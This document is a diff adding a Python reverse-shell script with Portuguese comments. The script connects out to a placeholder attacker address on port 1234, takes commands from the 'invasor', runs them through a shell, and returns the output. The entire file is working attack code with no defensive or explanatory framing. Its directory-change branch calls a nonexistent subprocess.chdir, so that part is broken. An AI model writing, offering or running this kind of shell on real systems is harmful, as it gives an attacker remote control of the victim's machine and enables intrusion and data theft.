@@ -1,0 +1,47 @@
+import socket
+import subprocess
+
+def main():
+    host = 'SEU_ENDEREÇO_IP'
+    porta = 1234
+
+    # Cria o socket
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+    # Conecta ao host remoto
+    try:
+        s.connect((host, porta))
+    except socket.error as e:
+        print(f'Erro ao conectar: {str(e)}')
+        return
+
+    # Loop principal
+    while True:
+        # Recebe o comando do invasor
+        comando = s.recv(1024).decode()
+
+        # Executa o comando no sistema
+        if comando.startswith('cd'):
+            # Altera o diretório atual
+            try:
+                novo_diretorio = comando.split('cd ')[1]
+                if novo_diretorio:
+                    # Tenta alterar o diretório
+                    subprocess.chdir(novo_diretorio)
+            except Exception as e:
+                resultado = str(e).encode()
+            else:
+                resultado = 'Diretório alterado com sucesso'.encode()
+        else:
+            # Executa o comando no shell
+            processo = subprocess.Popen(comando, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            resultado = processo.stdout.read() + processo.stderr.read()
+
+        # Envia o resultado de volta para o invasor
+        s.send(resultado)
+
+    # Fecha a conexão
+    s.close()
+
+if __name__ == '__main__':
+    main()
